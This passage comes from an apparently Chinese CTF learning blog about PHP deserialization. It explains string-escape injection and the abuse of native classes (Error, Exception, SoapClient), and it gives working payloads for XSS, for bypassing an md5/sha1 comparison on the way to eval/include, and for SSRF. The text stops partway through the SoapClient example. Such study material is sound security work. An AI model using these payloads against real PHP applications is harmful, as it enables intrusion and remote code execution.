class="hljs-variable">$tecacher</span>=<span class="hljs-string">&quot;other&quot;</span>;<br><span class="hljs-comment">#public $test;</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">#$b=$a;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-variable">$a</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>反序列化结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;student&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;bbbb&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;tecacher&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>可以看到输入的aa已经被替换成了bbbb。字符串实际长度增加了，但是字符串的读取长度并没有增加。所以逃逸了的两个字符bb。</p><p>这里我们可以构造<code>;</code>来提前闭合反序列化数据，实现逃逸。</p><p><strong>所以字符串增加利用的是插入与增加字符相同长度的反序列化数据，然后再利用闭合符号来让插入数据被当做正常内容进行反序列化。</strong></p><p>比如可以把teacher改成如下数据</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$tecac</span>her=<span class="hljs-string">&#x27;aaaa&quot;;&#125;x&#x27;</span>;<br></code></pre></td></tr></table></figure><p>成功反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;student&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;tecacher&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;bbbbbbbb&quot;</span>;&#125;x<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">object(test)#1 (2) &#123;</span><br><span class="hljs-string">  [&quot;</span>student<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(5) &quot;</span>other<span class="hljs-string">&quot;</span><br><span class="hljs-string">  [&quot;</span>tecacher<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(8) &quot;</span>bbbbbbbb<span class="hljs-string">&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>现在把上面代码test属性注释去掉，然后通过字符串逃逸给test反序列化赋值（一共逃逸26个字符）</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">$tecacher=<span class="hljs-symbol">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="hljs-string">&quot;;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:5:&quot;</span>hello<span class="hljs-string">&quot;;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;student&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;tecacher&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>test<span class="hljs-string">&quot;;N;&#125;</span><br><span class="hljs-string">object(test)#1 (3) &#123;</span><br><span class="hljs-string">  [&quot;</span>student<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(5) &quot;</span>other<span class="hljs-string">&quot;</span><br><span class="hljs-string">  [&quot;</span>tecacher<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(52) &quot;</span>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb<span class="hljs-string">&quot;</span><br><span class="hljs-string">  [&quot;</span>test<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(5) &quot;</span>hello<span class="hljs-string">&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h3><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>,<span class="hljs-variable">$data</span>);<span class="hljs-comment">//字符串增加</span><br> &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$student</span>=<span class="hljs-string">&quot;aaaaaaaa&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$tecacher</span>=<span class="hljs-string">&quot;other&quot;</span>;<br><span class="hljs-comment">#public $test;</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">#$b=$a;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$a</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>反序列化结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;student&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;bbbb&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;tecacher&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>可以看到student字段的长度标识与其实际字段长度不符合，缺少了4个字符。所以在反序列化过程中会继续向后读取四个字符，也就是读取到<code>:</code>。当然这样的结果是导致反序列化失败。</p><p>对于字符串减少的利用在于<strong>让它把我们不需要的字符都当做字段内容读取掉，那么我们在后面构造的内容就会被当做正常内容进行反序列化，从而实现反序列化任意类</strong>。</p><p>示例如下</p><p>首先计算student字段内容后面的长度</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:8:&quot;</span>tecache<span class="hljs-string">r&quot;;s:XX:&quot;</span><span class="hljs-regexp">//</span>共<span class="hljs-number">23</span>个字符<br></code></pre></td></tr></table></figure><p>所以需要构造12组<code>aaaa</code>，并在上面的字段内容开头补上一个字符。同时利用teacher参数构造我们想反序列化的类</p><p>参数设置如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$student</span>=<span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$tecacher</span>=<span class="hljs-string">&#x27;a&quot;;s:8:&quot;tecacher&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>成功反序列化</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109586.png" alt="image-20230728214400510"></p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>最后提一个我自己在做题的时候遇到的小坑，关于不同类型的成员属性在反序列化后的长度变化</p><ul><li>public无标记，变量名不变，长度不变: s:2:”op”;i:2;</li><li>protected在变量名前添加标记\00*\00，长度+3: s:5:”\00*\00op”;i:2;</li><li>private在变量名前添加标记\00(classname)\00，长度+2+类名长度: s:17:”\00FileHandler_Z\00op”;i:2;</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP原生类相关利用学习</title>
    <link href="/2023/07/25/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/07/25/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP原生类相关利用"><a href="#PHP原生类相关利用" class="headerlink" title="PHP原生类相关利用"></a>PHP原生类相关利用</h2><p>第一次听到原生类是听一个师傅说的，没想到这么快就在做题的时候遇到了。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PHP原生类是PHP的一些内置的类，可以直接调用。因为其包含一些魔术方法，所以可以在反序列化的时候利用。有时候，在题目中出现了反序列化，但是没有给出具体类，一般不是源码泄露再审计，就是利用php的原生类。</p><p>常用的原生类有以下几个：</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li></ul><p>遍历PHP内置类的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类<br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br><br></code></pre></td></tr></table></figure><h3 id="Error内置类进行"><a href="#Error内置类进行" class="headerlink" title="Error内置类进行"></a>Error内置类进行</h3><p>适用条件：</p><ul><li>适用于PHP7版本</li><li>开启报错的情况下</li></ul><p>Error是php7的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，这个方法将异常或者错误对象转换为字符串。</p><p>常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p><p><strong>类属性（参数）：</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><p>触发XSS示例</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到这个测试代码的特点是有反序列化入口但是没给反序列化的类</p><p>POC如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>利用Error错误输出的特点，在做题中可以用来绕过如md5，sha1等的比较</p><p>例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>          <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>              <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>          &#125;<br></code></pre></td></tr></table></figure><p>这段代码可以使用数组绕过，但是使用数组无法进行后续的RCE</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;this is a test&#x27;</span>,<span class="hljs-number">1</span>);<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>this is a test in /box/script.php:2<br>Stack trace:<br>#0 &#123;main&#125;<br></code></pre></td></tr></table></figure><p>可以发现只输出了异常休息内容和塞在行数，并没有输出异常代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;this is a test&#x27;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;this is a test&#x27;</span>,<span class="hljs-number">2</span>)<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.PHP_EOL;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>this is a test in /box/script.php:2<br>Stack trace:<br>#0 &#123;main&#125;<br><span class="hljs-keyword">Error: </span>this is a test in /box/script.php:2<br>Stack trace:<br>#0 &#123;main&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到两个的输出是一样的，但是输入却不同，所以可以利用这个特性来绕过判断</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-comment">//url取反绕过冒号过滤</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><p>Exception内置类和Error内置类用法基本相同，区别在于Exception内置类适用于php5&#x2F;7版本。</p><p><strong>类属性：</strong></p><ul><li>message：异常消息内容</li><li>code：异常代码</li><li>file：抛出异常的文件名</li><li>line：抛出异常在该文件中的行号</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>SoapClient类是PHP内置类中一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端。在做题时可用于SSRF</p><p>类方法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">SoapClient &#123;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$wsdl</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [] )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span> , <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-string">&quot;&quot;</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">bool</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span> , SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span> , <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure><p>内置类中有一个<code>__call</code>方法，<code>__call</code>方法被触发后，它可以发送HTTP和HTTPS请求，正是这样它可以被利用到SSRF中。</p><p>构造函数如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>利用SoapClient进行SSRF示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 